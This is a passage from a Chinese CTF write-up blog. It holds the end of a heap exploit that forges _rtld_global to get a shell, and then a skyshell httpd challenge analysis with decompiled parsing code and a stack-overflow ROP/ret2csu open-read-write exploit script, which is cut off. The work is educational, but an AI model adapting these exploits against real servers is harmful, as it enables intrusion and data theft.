function_">add</span>(<span class="params">idx, size, con = <span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i, <span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heapbase = key &lt;&lt; <span class="number">12</span></span><br><span class="line">lg(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;heapbase&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libcbase = uu64() - <span class="number">0x219ce0</span></span><br><span class="line">environ = libcbase + <span class="number">0x221200</span></span><br><span class="line">sys_addr = libcbase + <span class="number">0x50d60</span></span><br><span class="line">sh = libcbase + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">set_context = libcbase + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">l_next = libcbase + <span class="number">0x265890</span></span><br><span class="line">rtld = libcbase + <span class="number">0x264040</span></span><br><span class="line">ret = libcbase + <span class="number">0x29cd6</span></span><br><span class="line">pop_rdi = libcbase + <span class="number">0x2a3e5</span></span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x1f0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xf0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x1f0</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xf0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64((rtld)  ^ key))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xf0</span>, p64(heapbase + <span class="number">0xcb0</span>) + <span class="string">b&#x27;\x04&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_rtld_global_addr = heapbase + <span class="number">0xcb0</span></span><br><span class="line">fake_rtld_global = p64(<span class="number">0</span>) + p64(l_next) + p64(<span class="number">0</span>) + p64(fake_rtld_global_addr)</span><br><span class="line">fake_rtld_global += p64(set_context) + p64(ret)</span><br><span class="line">fake_rtld_global += p64(sh)</span><br><span class="line">fake_rtld_global += p64(ret)</span><br><span class="line">fake_rtld_global += p64(sys_addr)</span><br><span class="line">fake_rtld_global += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x80</span></span><br><span class="line">fake_rtld_global += p64(fake_rtld_global_addr + <span class="number">0x28</span> + <span class="number">0x18</span>)</span><br><span class="line">fake_rtld_global += p64(pop_rdi)</span><br><span class="line">fake_rtld_global += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x100</span> - <span class="built_in">len</span>(fake_rtld_global))</span><br><span class="line">fake_rtld_global += p64(fake_rtld_global_addr + <span class="number">0x10</span> + <span class="number">0x110</span>) * <span class="number">3</span></span><br><span class="line">fake_rtld_global += p64(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(fake_rtld_global_addr + <span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x200</span>, fake_rtld_global)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xfc</span></span><br><span class="line">payload += p8(<span class="number">0x8</span>) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">3</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x200</span>, payload)</span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>2022柏鹭杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2022赣育杯pwn1-skyshell题解</title>
    <url>/2022/10/11/2022%E8%B5%A3%E8%82%B2%E6%9D%AFpwn1-skyshell%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>2022赣育杯skyshell题解</p>
<span id="more"></span>

<p>用c++实现的httpd</p>
<p>题目给了一个二进制文件、start.sh以及www文件夹</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100912502.png" alt="image-20221011101559520"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line">PORT=8888</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;listen on <span class="variable">$PORT</span>&quot;</span></span><br><span class="line">socat tcp-listen:<span class="variable">$PORT</span>,reuseaddr,fork <span class="built_in">exec</span>:./pwn</span><br></pre></td></tr></table></figure>

<p>本地运行start.sh，浏览器访问8888端口</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100912343.png" alt="image-20221011101825348"></p>
<p>实现了一个简易的shell，不过如果去分析www目录下的shell.js可以发现这里是一个假的shell</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">TerminalShell</span>.<span class="property">commands</span>.<span class="property">dir</span> = <span class="title class_">TerminalShell</span>.<span class="property">commands</span>.<span class="property">ls</span> = <span class="keyword">function</span>(<span class="params">b, c</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = $(<span class="string">&quot;&lt;ul&gt;&quot;</span>);</span><br><span class="line">    $.<span class="title function_">each</span>(<span class="variable language_">this</span>.<span class="property">pwd</span>,</span><br><span class="line">    <span class="keyword">function</span>(<span class="params">d, e</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">type</span> == <span class="string">&quot;dir&quot;</span>) &#123;</span><br><span class="line">            d += <span class="string">&quot;/&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((d[<span class="number">0</span>] != <span class="string">&quot;.&quot;</span> &amp;&amp; d[<span class="number">0</span>] != <span class="string">&quot;/&quot;</span>) || b.<span class="property">map</span> || b.<span class="property">god</span>) &#123;</span><br><span class="line">            a.<span class="title function_">append</span>($(<span class="string">&quot;&lt;li&gt;&quot;</span>).<span class="title function_">text</span>(d))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span>(c) &#123;</span><br><span class="line">        <span class="keyword">if</span>(c == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">            b.<span class="title function_">print</span>(<span class="string">&quot;bin  boot  dev  etc  flag home  lib  lib64  lost+found  opt  proc  root  run  sbin  srv  sys  tmp  usr  var&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&quot;/home&quot;</span>) &#123;</span><br><span class="line">            b.<span class="title function_">print</span>(<span class="string">&quot;sky&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            b.<span class="title function_">print</span>(<span class="string">&quot;ls: cannot access &#x27;&quot;</span> + c + <span class="string">&quot;&#x27;: Permission denied&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        b.<span class="title function_">print</span>(a)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>大部分命令都是前端处理输出的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">TerminalShell</span>.<span class="property">commands</span>.<span class="property">write</span> = <span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(b) &#123;</span><br><span class="line">        a.<span class="title function_">print</span>(<span class="string">&quot;you write [&quot;</span> + b + <span class="string">&quot;] to admin &quot;</span>); </span><br><span class="line">        </span><br><span class="line">        $.<span class="title function_">post</span>(<span class="string">&quot;/?request=write&quot;</span>,&#123;<span class="attr">msg</span>:b&#125;,<span class="keyword">function</span>(<span class="params">result</span>)&#123;</span><br><span class="line">            a.<span class="title function_">print</span>(<span class="string">&quot;response: &quot;</span> + result.<span class="property">msg</span>); </span><br><span class="line">            <span class="comment">//$(&quot;span&quot;).html(result);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        a.<span class="title function_">print</span>(<span class="string">&quot;Usage: write [your msg]&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>只有write命令是对后端进行了一个GET+POST的请求</p>
<p>接下来分析附件中的二进制文件</p>
<p>IDA简单分析过后可以找到解析http报文的函数：<code>hackme::net::http::parse_header</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v42 = (__int64)<span class="keyword">this</span> + <span class="number">24</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v43 = std::string::<span class="built_in">find</span>((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">24</span>, <span class="string">&quot;\r\n&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v43 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    std::string::<span class="built_in">substr</span>(v15, v42, <span class="number">0LL</span>, v43);</span><br><span class="line">    v1 = std::string::<span class="built_in">size</span>(v42);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= v43 + <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v44 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      std::string::<span class="built_in">substr</span>(v16, v42, v43 + <span class="number">2</span>, <span class="number">-1LL</span>);</span><br><span class="line">      std::string::<span class="keyword">operator</span>=(v42, v16);</span><br><span class="line">      std::string::~<span class="built_in">string</span>(v16);</span><br><span class="line">      v41 = <span class="number">-1</span>;</span><br><span class="line">      v2 = std::string::<span class="built_in">find</span>(v15, <span class="string">&quot;GET&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">      v41 = v2;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v41 = std::string::<span class="built_in">find</span>(v15, <span class="string">&quot;POST&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v41 &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v41 = std::string::<span class="built_in">find</span>(v15, <span class="string">&quot;HEAD&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v41 &lt; <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v41 = std::string::<span class="built_in">find</span>(v15, <span class="string">&quot;DELETE&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v41 &lt; <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v26);</span><br><span class="line">              std::string::<span class="built_in">basic_string</span>(v25, <span class="string">&quot;method&quot;</span>, &amp;v26);</span><br><span class="line">              v7 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v25);</span><br><span class="line">              std::string::<span class="keyword">operator</span>=(v7, <span class="string">&quot;unknown&quot;</span>);</span><br><span class="line">              std::string::~<span class="built_in">string</span>(v25);</span><br><span class="line">              std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v26);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v43 = v41;</span><br><span class="line">              std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v24);</span><br><span class="line">              std::string::<span class="built_in">basic_string</span>(v23, <span class="string">&quot;method&quot;</span>, &amp;v24);</span><br><span class="line">              v6 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v23);</span><br><span class="line">              std::string::<span class="keyword">operator</span>=(v6, <span class="string">&quot;delete&quot;</span>);</span><br><span class="line">              std::string::~<span class="built_in">string</span>(v23);</span><br><span class="line">              std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v24);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v43 = v41;</span><br><span class="line">            std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v22);</span><br><span class="line">            std::string::<span class="built_in">basic_string</span>(v21, <span class="string">&quot;method&quot;</span>, &amp;v22);</span><br><span class="line">            v5 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v21);</span><br><span class="line">            std::string::<span class="keyword">operator</span>=(v5, <span class="string">&quot;head&quot;</span>);</span><br><span class="line">            std::string::~<span class="built_in">string</span>(v21);</span><br><span class="line">            std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v22);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v43 = v41;</span><br><span class="line">          std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v20);</span><br><span class="line">          std::string::<span class="built_in">basic_string</span>(v19, <span class="string">&quot;method&quot;</span>, &amp;v20);</span><br><span class="line">          v4 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v19);</span><br><span class="line">          std::string::<span class="keyword">operator</span>=(v4, <span class="string">&quot;post&quot;</span>);</span><br><span class="line">          std::string::~<span class="built_in">string</span>(v19);</span><br><span class="line">          std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v20);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v43 = v41;</span><br><span class="line">        std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v18);</span><br><span class="line">        std::string::<span class="built_in">basic_string</span>(v17, <span class="string">&quot;method&quot;</span>, &amp;v18);</span><br><span class="line">        v3 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v17);</span><br><span class="line">        std::string::<span class="keyword">operator</span>=(v3, <span class="string">&quot;get&quot;</span>);</span><br><span class="line">        std::string::~<span class="built_in">string</span>(v17);</span><br><span class="line">        std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v18);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v43 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v40 = std::string::<span class="built_in">find</span>(v15, <span class="number">47LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v40 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          std::string::<span class="built_in">substr</span>(v27, v15, v40, <span class="number">-1LL</span>);</span><br><span class="line">          std::string::<span class="keyword">operator</span>=(v15, v27);</span><br><span class="line">          std::string::~<span class="built_in">string</span>(v27);</span><br><span class="line">          v39 = std::string::<span class="built_in">find</span>(v15, <span class="number">32LL</span>, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v39 &gt;= <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            std::string::<span class="built_in">substr</span>(v28, v15, <span class="number">0LL</span>, v39);</span><br><span class="line">            std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v30);</span><br><span class="line">            std::string::<span class="built_in">basic_string</span>(v29, <span class="string">&quot;url&quot;</span>, &amp;v30);</span><br><span class="line">            v8 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v29);</span><br><span class="line">            std::string::<span class="keyword">operator</span>=(v8, v28);</span><br><span class="line">            std::string::~<span class="built_in">string</span>(v29);</span><br><span class="line">            std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v30);</span><br><span class="line">            std::string::~<span class="built_in">string</span>(v28);</span><br><span class="line">            std::string::<span class="built_in">substr</span>(v31, v15, v39, <span class="number">-1LL</span>);</span><br><span class="line">            std::string::<span class="keyword">operator</span>=(v15, v31);</span><br><span class="line">            std::string::~<span class="built_in">string</span>(v31);</span><br><span class="line">            v38 = std::string::<span class="built_in">find</span>(v15, <span class="number">47LL</span>, <span class="number">0LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v38 &gt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              std::string::<span class="built_in">substr</span>(v32, v15, v38 + <span class="number">1</span>, <span class="number">-1LL</span>);</span><br><span class="line">              std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v34);</span><br><span class="line">              std::string::<span class="built_in">basic_string</span>(v33, <span class="string">&quot;version&quot;</span>, &amp;v34);</span><br><span class="line">              v9 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v33);</span><br><span class="line">              std::string::<span class="keyword">operator</span>=(v9, v32);</span><br><span class="line">              std::string::~<span class="built_in">string</span>(v33);</span><br><span class="line">              std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v34);</span><br><span class="line">              std::string::~<span class="built_in">string</span>(v32);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v44 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v44 = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v44 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    std::string::~<span class="built_in">string</span>(v15);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v44 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v44 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    std::map&lt;std::string,std::string&gt;::<span class="built_in">clear</span>((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>);</span><br><span class="line">    <span class="keyword">return</span> v44;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v37 = <span class="number">-1</span>;</span><br><span class="line">      v36 = <span class="number">-1</span>;</span><br><span class="line">      v37 = std::string::<span class="built_in">find</span>(v42, <span class="string">&quot;\r\n&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v37 &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      std::string::<span class="built_in">substr</span>(v13, v42, <span class="number">0LL</span>, v37);</span><br><span class="line">      std::string::<span class="built_in">substr</span>(v35, v42, v37 + <span class="number">2</span>, <span class="number">-1LL</span>);</span><br><span class="line">      std::string::<span class="keyword">operator</span>=(v42, v35);</span><br><span class="line">      std::string::~<span class="built_in">string</span>(v35);</span><br><span class="line">      v36 = std::string::<span class="built_in">find</span>(v13, <span class="number">58LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v36 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        std::string::<span class="built_in">substr</span>(v14, v13, <span class="number">0LL</span>, v36);</span><br><span class="line">        std::string::<span class="built_in">substr</span>(v15, v13, v36 + <span class="number">2</span>, <span class="number">-1LL</span>);</span><br><span class="line">        hackme::net::http::<span class="built_in">str_lower</span>(<span class="keyword">this</span>, v14);</span><br><span class="line">        hackme::net::http::<span class="built_in">str_lower</span>(<span class="keyword">this</span>, v15);</span><br><span class="line">        v12 = std::map&lt;std::string,std::string&gt;::<span class="keyword">operator</span>[]((<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">152</span>, v14);</span><br><span class="line">        std::string::<span class="keyword">operator</span>=(v12, v15);</span><br><span class="line">        std::string::~<span class="built_in">string</span>(v15);</span><br><span class="line">        std::string::~<span class="built_in">string</span>(v14);</span><br><span class="line">        v11 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v44 = <span class="number">0</span>;</span><br><span class="line">        v11 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      std::string::~<span class="built_in">string</span>(v13);</span><br><span class="line">      <span class="keyword">if</span> ( v11 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">return</span> v44;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析这个函数的代码是能拿到输入格式的，不过社畜师傅教了一个更简单的方法，直接抓包拿到http报文</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100913836.png" alt="image-20221011103808822"></p>
<p>write命令使用GET传参的方法，write后面接的数据使用POST传参的方法。从右边的响应可以看到后端在请求成功是有回显的</p>
<p>而后端正是运行的二进制文件，去IDA的字符串窗口搜索该字符串，交叉引用找到调用该字符串的地方就能找到write命令了</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100913164.PNG"></p>
<p>这里有一个copy的操作</p>
<p>将从v2拷贝v1长度的数据到dest，而v1的大小刚好就是接在write命令之后的数据长度，也就是说这里是我们可控的，只要控制好我们write的数据就能挟持程序控制流了</p>
<p>为了验证我们的猜想，在网页端POST一段垃圾数据进去试试</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100913403.png" alt="image-20221011105422527"></p>
<p>在POST了0x1000大小的数据后网页直接寄了</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100913991.png" alt="image-20221011105518525"></p>
<p>server端也是成功crash，说明咱们的溢出成功了</p>
<p>剩下的就是简单的栈溢出+retcsu构造orw了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28834</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">con</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;POST /?request=write HTTP/1.1\r\n&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;Content-Length: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(con)).encode() + <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">    payload += con</span><br><span class="line">    s(payload) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x403669</span></span><br><span class="line">pop_rbp = <span class="number">0x403590</span></span><br><span class="line">start = <span class="number">0x40066E</span></span><br><span class="line">bss = elf.bss() + <span class="number">0x500</span></span><br><span class="line">gadget1 = <span class="number">0x411260</span>  <span class="comment">#call r12</span></span><br><span class="line">gadget2 = <span class="number">0x41127A</span>  <span class="comment">#6 pop ret</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">rdi, rsi, rdx, r12</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += p64(gadget2) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(r12) + p64(rdi) + p64(rsi) + p64(rdx)</span><br><span class="line">    payload += p64(gadget1) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x411283</span></span><br><span class="line">pop_rsi = <span class="number">0x409c7a</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x5d8</span> + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(bss) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rbp) + p64(bss) + p64(leave_ret)</span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;b* 0x404767&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;b* 0x404739&#x27;)</span></span><br><span class="line"></span><br><span class="line">post(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw = <span class="string">b&#x27;flag&#x27;</span> + p32(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">orw += ret2csu(<span class="number">0x30</span>, bss + <span class="number">0x200</span>, <span class="number">3</span>, elf.got[<span 